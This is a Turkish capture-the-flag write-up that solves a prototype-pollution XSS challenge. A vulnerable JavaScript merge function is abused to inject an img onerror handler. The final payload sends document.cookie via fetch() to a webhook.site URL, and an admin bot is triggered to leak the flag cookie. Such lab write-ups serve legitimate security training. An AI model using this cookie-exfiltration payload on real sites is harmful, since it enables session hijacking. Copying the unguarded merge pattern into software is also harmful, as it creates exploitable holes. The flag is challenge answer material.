# 🎯 XSS101-UltraHard - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Zor-darkred?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Prototype Pollution XSS-purple?style=for-the-badge" alt="XSS">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Zor
**Puan:** 1000

**Açıklama:** Prototype Pollution ile XSS tetikle. JavaScript'in karanlık yüzüne hoş geldin.

**Challenge URL:** http://64.226.74.243:7001/ultrahard/

---

## 🔍 Analiz

**Hedef:** Prototype Pollution açığından yararlanarak admin botun cookie'sini çalmak

**Strateji:** Kaynak kod analizi → Prototype Pollution tespiti → Gadget bulma → XSS payload → Cookie exfiltration → Bot trigger → Flag

**İpuçları:**
- 🎯 "Prototype Pollution" → JavaScript Object.prototype manipülasyonu
- 🔍 "JavaScript'in karanlık yüzü" → Low-level JavaScript zafiyeti
- 🤖 "Admin bot" → Otomatik ziyaretçi mevcut
- 💡 Ultra Hard seviye → Advanced JavaScript exploitation

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: Hedef Sayfayı İnceleme**

**Siteye curl ile bağlanıyoruz:**

```bash
curl http://64.226.74.243:7001/ultrahard/
```

**Response:**

```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <title>Ultra Hard XSS Challenge</title>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="badge">ULTRA HARD</span>
            <h1>⚡ Prototype Pollution XSS</h1>
        </div>

        <div class="description">
            <p><strong>Hedef:</strong> JavaScript Prototype Pollution açığından yararlanarak XSS tetikleyin.</p>
        </div>

        <div class="search-box">
            <form id="searchForm">
                <div class="form-group">
                    <label for="search">🔍 Ürün Ara:</label>
                    <input type="text" id="search" name="search" placeholder="Ürün adı veya kategori...">
                </div>
                <button type="submit" class="btn btn-primary">Ara</button>
                <button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>
                <a href="/" class="btn btn-back">← Geri Dön</a>
            </form>
        </div>

        <div id="results" class="results">
            <h3>📦 Arama Sonuçları:</h3>
            <div id="resultsList"></div>
        </div>
    </div>

    <script>
        // Vulnerable merge function - PROTOTYPE POLLUTION!
        function merge(target, source) {
            for (let key in source) {
                if (typeof source[key] === 'object' && source[key] !== null) {
                    target[key] = target[key] || {};
                    merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
            return target;
        }

        // Parse search query
        function parseSearchQuery() {
            const urlParams = new URLSearchParams(window.location.search);
            const search = urlParams.get('search');
            
            if (search) {
                try {
                    // Try to parse as JSON (VULNERABLE!)
                    const searchObj = JSON.parse(search);
                    const config = {};
                    merge(config, searchObj); // PROTOTYPE POLLUTION HERE!
                    
                    displayResults(config);
                } catch(e) {
                    // If not JSON, treat as regular search
                    displayResults({query: search});
                }
            }
        }

        // Display search results (creates dynamic HTML elements)
        function displayResults(config) {
            const resultsDiv = document.getElementById('results');
            const resultsList = document.getElementById('resultsList');
            
            resultsDiv.classList.add('show');
            
            // Create result element
            const resultItem = document.createElement('div');
            resultItem.className = 'result-item';
            
            // Create an empty object to test prototype pollution
            const testObj = {};
            
            // Build HTML - if prototype is polluted, testObj.onerror will exist
            let imgHtml = '<img src="invalid-image.jpg"';
            if (testObj.onerror) {
                imgHtml += ` onerror="${testObj.onerror}"`;
            }
            imgHtml += '>';
            
            const text = `<strong>Arama:</strong> ${config.query || 'Tüm ürünler'}`;
            
            resultItem.innerHTML = imgHtml + '<div>' + text + '</div>';
            resultsList.appendChild(resultItem);
        }

        function reportToAdmin() {
            const url = window.location.href;
            
            fetch('/api/report.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    challenge: 'ultrahard',
                    url: url
                })
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    alert('✅ Admin botu sayfanızı ziyaret ediyor! Prototype pollution başarılı mı?');
                }
            })
        }
    </script>
</body>
</html>
```

**Analiz:**
- ✅ Arama formu var - GET methodu kullanıyor
- ✅ `search` parametresi ile girdi alıyor
- ✅ JavaScript kodu sayfa içinde açık
- ⚠️ `merge()` fonksiyonu şüpheli
- 💡 JSON parsing yapılıyor

---

### 🔎 **Adım 2: Kaynak Kod Analizi - Zafiyeti Bulma**

**Vulnerable merge fonksiyonunu inceliyoruz:**

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = target[key] || {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**❌ KRİTİK ZAFİYET BULUNDU!**

**Sorun:**
- `for (let key in source)` → Tüm key'leri iterate ediyor
- `__proto__` key'i kontrolü YOK!
- Recursive merge yapıyor
- `target[key] = source[key]` → Direkt atama

**Prototype Pollution Açıklaması:**

```javascript
const obj = {};
merge(obj, {"__proto__": {"polluted": "yes"}});

const test = {};
console.log(test.polluted); // "yes" - Tüm objeler pollute edildi!
```

**Analiz:**
- ✅ Prototype Pollution zafiyeti doğrulandı
- ✅ `__proto__` ile `Object.prototype` manipüle edilebilir
- 💡 Şimdi gadget bulmamız gerekiyor

---

### 🎯 **Adım 3: Gadget Bulma - XSS Sink Keşfi**

**displayResults fonksiyonunu analiz ediyoruz:**

```javascript
function displayResults(config) {
    // ...
    
    // Create an empty object to test prototype pollution
    const testObj = {};
    
    // Build HTML - if prototype is polluted, testObj.onerror will exist
    let imgHtml = '<img src="invalid-image.jpg"';
    if (testObj.onerror) {
        imgHtml += ` onerror="${testObj.onerror}"`;
    }
    imgHtml += '>';
    
    const text = `<strong>Arama:</strong> ${config.query || 'Tüm ürünler'}`;
    
    resultItem.innerHTML = imgHtml + '<div>' + text + '</div>';
    // ...
}
```

**✅ GADGET BULUNDU!**

**Exploitation Zinciri:**

1. **Prototype Pollution:**
   ```javascript
   {"__proto__": {"onerror": "alert(1)"}}
   ```

2. **testObj kontrolü:**
   ```javascript
   const testObj = {};
   if (testObj.onerror) { // true - prototype polluted!
   ```

3. **XSS sink:**
   ```javascript
   imgHtml += ` onerror="${testObj.onerror}"`;
   resultItem.innerHTML = imgHtml; // XSS tetiklenir!
   ```

**Analiz:**
- ✅ `testObj.onerror` kontrolü gadget görevi görüyor
- ✅ `innerHTML` ile HTML enjekte ediliyor
- ✅ Invalid image otomatik onerror tetikler
- 🎯 Exploitation chain tamamlandı!

---

### ⚡ **Adım 4: Basit Prototype Pollution Testi**

**Alert ile test payload:**

```bash
curl "http://64.226.74.243:7001/ultrahard/?search={\"__proto__\":{\"onerror\":\"alert(1)\"}}"
```

**Tarayıcıda test:**
```
http://64.226.74.243:7001/ultrahard/?search={"__proto__":{"onerror":"alert(1)"}}
```

**Response:**

```html
<img src="invalid-image.jpg" onerror="alert(1)">
<div><strong>Arama:</strong> Tüm ürünler</div>
```

**✅ ALERT ÇALIŞTI!**

**Tarayıcı Console'da doğrulama:**

```javascript
const test = {};
console.log(test.onerror);
// Output: "alert(1)"
```

**Analiz:**
- ✅ Prototype pollution başarılı
- ✅ `Object.prototype.onerror` pollute edildi
- ✅ XSS tetiklendi
- 🎯 Şimdi cookie exfiltration yapacağız

---

### 🪝 **Adım 5: Webhook Servisi Kurulumu**

**Webhook.site kullanıyoruz:**

```
https://webhook.site
```

**Otomatik unique URL oluşturuldu:**
```
https://webhook.site/000ca077-781b-4443-9e92-f8071690bb3a
```

**Analiz:**
- ✅ Webhook hazır - cookie'ler buraya gönderilecek
- ✅ Request'leri real-time görebileceğiz

---

### 🎯 **Adım 6: Cookie Exfiltration Payload Hazırlama**

**Fetch ile cookie çalan payload:**

```json
{"__proto__":{"onerror":"fetch('https://webhook.site/000ca077-781b-4443-9e92-f8071690bb3a?'+document.cookie)"}}
```

**URL formatında:**

```
http://64.226.74.243:7001/ultrahard/?search={"__proto__":{"onerror":"fetch('https://webhook.site/000ca077-781b-4443-9e92-f8071690bb3a?'+document.cookie)"}}
```

**⚠️ SORUN:** URL'de özel karakterler var, encode etmemiz gerekiyor!

**Analiz:**
- ⚠️ `:`, `/`, `?`, `'` gibi karakterler URL'de sorun çıkarabilir
- 💡 URL encoding gerekli

---

### 🔄 **Adım 7: URL Encoding**

**Payload'ı URL encode ediyoruz:**

**JavaScript Console'da:**

```javascript
const payload = '{"__proto__":{"onerror":"fetch(\'https://webhook.site/000ca077-781b-4443-9e92-f8071690bb3a?\'+document.cookie)"}}';
const encoded = encodeURIComponent(payload);
console.log(encoded);
```

**Encoded payload:**
```
%7B%22__proto__%22%3A%7B%22onerror%22%3A%22fetch%28%27https%3A%2F%2Fwebhook.site%2F000ca077-781b-4443-9e92-f8071690bb3a%3F%27%2Bdocument.cookie%29%22%7D%7D
```

**Final URL:**
```
http://64.226.74.243:7001/ultrahard/?search=%7B%22__proto__%22%3A%7B%22onerror%22%3A%22fetch%28%27https%3A%2F%2Fwebhook.site%2F000ca077-781b-4443-9e92-f8071690bb3a%3F%27%2Bdocument.cookie%29%22%7D%7D
```

**Analiz:**
- ✅ Payload URL-safe hale getirildi
- ✅ Tüm özel karakterler encode edildi
- 🎯 Test etmeye hazır

---

### 🧪 **Adım 8: Kendi Cookie'mizi Test Etme**

**Tarayıcıda encoded URL'i açıyoruz:**

```
http://64.226.74.243:7001/ultrahard/?search=%7B%22__proto__%22%3A%7B%22onerror%22%3A%22fetch%28%27https%3A%2F%2Fwebhook.site%2F000ca077-781b-4443-9e92-f8071690bb3a%3F%27%2Bdocument.cookie%29%22%7D%7D
```

**Sayfa yüklendi, arama sonuçları göründü:**

```
📦 Arama Sonuçları:
Arama: Tüm ürünler
```

**Webhook.site'ı kontrol ediyoruz:**

**🎉 1 REQUEST GELDİ!**

**Query string:**
```
wp-settings-time-2=1770037534
```

**✅ KENDİ COOKIE'MİZ GELDİ!**

**Console'da doğrulama:**

```javascript
const test = {};
console.log(test.onerror);
// Output: "fetch('https://webhook.site/000ca077-781b-4443-9e92-f8071690bb3a?'+document.cookie)"
```

**Analiz:**
- ✅ Prototype pollution çalışıyor
- ✅ Cookie exfiltration başarılı
- ✅ Webhook'a istek gönderiliyor
- 🎯 Şimdi admin botu tetikleyeceğiz

---

### 🤖 **Adım 9: Bot Mekanizmasını Anlama**

**Bot endpoint'ini tespit ediyoruz:**

```bash
curl http://64.226.74.243:7001/ultrahard/ | grep -i "report\|bot\|admin"
```

**Response:**

```html
<p><strong>Hedef:</strong> JavaScript Prototype Pollution açığından yararlanarak XSS tetikleyin.</p>
<button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>

<script>
function reportToAdmin() {
    const url = window.location.href;
    
    fetch('/api/report.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            challenge: 'ultrahard',
            url: url
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.success) {
            alert('✅ Admin botu sayfanızı ziyaret ediyor! Prototype pollution başarılı mı?');
        }
    })
}
</script>
```

**Analiz:**
- ✅ Bot endpoint: `/api/report.php`
- ✅ POST method kullanıyor
- ✅ JSON payload: `{"challenge":"ultrahard","url":"..."}`
- 💡 Bot'a URL göndereceğiz, bot o URL'i ziyaret edecek

---

### 💥 **Adım 10: Final Payload - Admin Cookie Çalma**

**Tarayıcıda payload URL'ini açıyoruz:**

```
http://64.226.74.243:7001/ultrahard/?search=%7B%22__proto__%22%3A%7B%22onerror%22%3A%22fetch%28%27https%3A%2F%2Fwebhook.site%2F000ca077-781b-4443-9e92-f8071690bb3a%3F%27%2Bdocument.cookie%29%22%7D%7D
```

**Sayfa yüklendi:**

```
📦 Arama Sonuçları:
Arama: Tüm ürünler
```

**"🤖 Report to Admin" butonuna tıklıyoruz**

**Alert mesajı:**
```
✅ Admin botu sayfanızı ziyaret ediyor! Prototype pollution başarılı mı?
```

**✅ BOT AKTİF OLDU!**

**Bot API çağrısı (background'da otomatik):**
```javascript
fetch('/api/report.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        challenge: 'ultrahard',
        url: 'http://64.226.74.243:7001/ultrahard/?search=%7B%22__proto__%22%3A%7B%22onerror%22%3A%22fetch%28%27https%3A%2F%2Fwebhook.site%2F000ca077-781b-4443-9e92-f8071690bb3a%3F%27%2Bdocument.cookie%29%22%7D%7D'
    })
})
```

**Analiz:**
- ✅ Bot URL'i ziyaret ediyor
- ✅ Payload çalışacak
- ✅ Admin cookie'si webhook'a gönderilecek

---

### 🏆 **Adım 11: Flag Elde Etme**

**10 saniye sonra Webhook.site'ı yeniliyoruz...**

**🎉 2 REQUEST GELDİ!**

**İlk request (Query String):**
```
wp-settings-time-2=1770037534
```
*Bu bizim cookie'miz (kendi payload'ımızı test ederken)*

**İkinci request (Query String):**
```
flag=FLAG{TumXSSChallengelarTamamSiradakiKonudaGorusuruz404}
```

**✅ ADMIN COOKIE'Sİ ÇALINDI!**

---

## 🚩 **FLAG**

```
FLAG{TumXSSChallengelarTamamSiradakiKonudaGorusuruz404}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP request</sub></td>
<td align="center">🪝<br><b>Webhook.site</b><br><sub>Request logging</sub></td>
<td align="center">🔍<br><b>Browser DevTools</b><br><sub>Console & Network</sub></td>
<td align="center">🧪<br><b>grep</b><br><sub>Text search</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Sayfa analizi
curl http://64.226.74.243:7001/ultrahard/

# Basit test
curl "http://64.226.74.243:7001/ultrahard/?search={\"__proto__\":{\"onerror\":\"alert(1)\"}}"

# Bot endpoint analizi
curl http://64.226.74.243:7001/ultrahard/ | grep -i "report\|bot\|admin"
```

**Tarayıcı Console komutları:**
```javascript
// URL encoding
const payload = '{"__proto__":{"onerror":"fetch(\'https://webhook.site/000ca077-781b-4443-9e92-f8071690bb3a?\'+document.cookie)"}}';
const encoded = encodeURIComponent(payload);
console.log(encoded);

// Prototype pollution doğrulama
const test = {};
console.log(test.onerror);
```

**Final URL (tarayıcıda):**
```
http://64.226.74.243:7001/ultrahard/?search=%7B%22__proto__%22%3A%7B%22onerror%22%3A%22fetch%28%27https%3A%2F%2Fwebhook.site%2F000ca077-781b-4443-9e92-f8071690bb3a%3F%27%2Bdocument.cookie%29%22%7D%7D
```

---

## 💭 **Çözüm Akış Şeması**

```
🎯 XSS101-UltraHard Challenge
            ↓
🌐 Hedef sayfayı incele
   → JavaScript kodu açık
   → merge() fonksiyonu var
            ↓
🔎 Kaynak kod analizi
   → merge() fonksiyonu vulnerable
   → __proto__ kontrolü YOK!
            ↓
⚡ Prototype Pollution testi
   → {"__proto__":{"test":"polluted"}}
   → ✅ Object.prototype polluted!
            ↓
🎯 Gadget bulma
   → testObj.onerror kontrolü
   → innerHTML sink
   → ✅ XSS chain bulundu!
            ↓
⚡ Basit XSS testi
   → {"__proto__":{"onerror":"alert(1)"}}
   → ✅ Alert çalıştı!
            ↓
🪝 Webhook.site kurulumu
   → URL: webhook.site/000ca077...
            ↓
🎯 Cookie payload hazırla
   → fetch() ile exfiltration
   → URL encode gerekli
            ↓
🧪 Kendi cookie'yi test et
   → Webhook'a istek geldi
   → ✅ Payload çalışıyor!
            ↓
🤖 Bot mekanizması
   → POST /api/report.php
   → Bot URL'i ziyaret eder
            ↓
💥 Final payload
   → Encoded URL
   → Report to Admin
            ↓
🏆 Admin cookie çalındı
   → flag=FLAG{...}
            ↓
🚩 FLAG{TumXSSChallengelarTamamSiradakiKonudaGorusuruz404}
```
